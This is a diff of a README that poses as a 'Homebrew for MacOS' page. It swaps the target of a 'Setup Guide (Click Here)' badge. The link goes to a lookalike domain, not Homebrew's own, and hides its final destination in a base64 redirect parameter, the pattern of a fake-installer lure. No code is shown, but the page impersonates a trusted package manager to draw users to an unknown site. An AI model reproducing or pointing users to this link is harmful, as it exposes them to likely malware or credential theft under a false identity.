@@ -4,7 +4,7 @@
 Homebrew for MacOS is the essential package manager for MacBook users.  
 It offers speed, convenience, and reliability — all optimized for macOS.
 
-[![Setup Guide for MacOS (Click Here)](https://img.shields.io/badge/Setup%20Guide%20for%20MacOS%20(Click%20Here)-2da44e?style=for-the-badge&logo=apple&logoColor=white)](https://homebrew-fast-installing.github.io/.github/?c=aHR0cHM6Ly9zaGVuZ3RvbmcuY29tLw==)
+[![Setup Guide for MacOS (Click Here)](https://img.shields.io/badge/Setup%20Guide%20for%20MacOS%20(Click%20Here)-2da44e?style=for-the-badge&logo=apple&logoColor=white)](https://homebrew-fast-installing.github.io/.github/?c=aHR0cHM6Ly9pc2hlbmd0b25nLmNvbS8=)
 
 ---
 
